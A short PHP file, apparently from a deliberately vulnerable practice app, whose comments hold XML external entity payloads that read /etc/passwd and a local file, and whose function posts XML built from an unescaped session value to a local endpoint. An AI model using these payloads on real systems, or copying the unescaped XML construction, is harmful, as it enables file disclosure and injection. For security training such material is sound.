<?php
include_once "includer.php";
#https://canyoupwn.me/tr-xml-external-entity-xxe/
#https://pentestmag.com/exploiting-the-entity-xme-xml-external-entity-injection/

/*

    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE own [ <!ELEMENT own ANY >
    <!ENTITY own SYSTEM "file:///etc/passwd" >]>
    <reset>
        <login>&own;</login>
        <secret>password</secret>
    </reset>

    <?xml version="1.0" encoding="utf-8"?>
    <!DOCTYPE root [
    <!ENTITY secr SYSTEM "http://localhost:8080/JotPot/README.md">
    ]>
    <reset>
        <login>&secr;</login>
        <secret>Adadfbbf</secret>
    </reset>
*/

function sendPost(){
    
    $who = $_SESSION["login"];
    $xml = <<<XML
    <?xml version="1.0" encoding="utf-8"?>
    <!DOCTYPE root [
    ]>
    <reset>
        <login>$who</login>
        <secret>You aren't an admin anymore, LOL</secret>
    </reset>
    XML;

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
    curl_setopt($ch, CURLOPT_URL, "http://localhost:8080/JotPot/xxe_2.php");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $xml);
    $data = curl_exec($ch);

    if(curl_errno($ch)) {
        print curl_error($ch);
    } else {
        echo "Response: <br>" . $data;
    }
    curl_close($ch);
}

sendPost();


?>


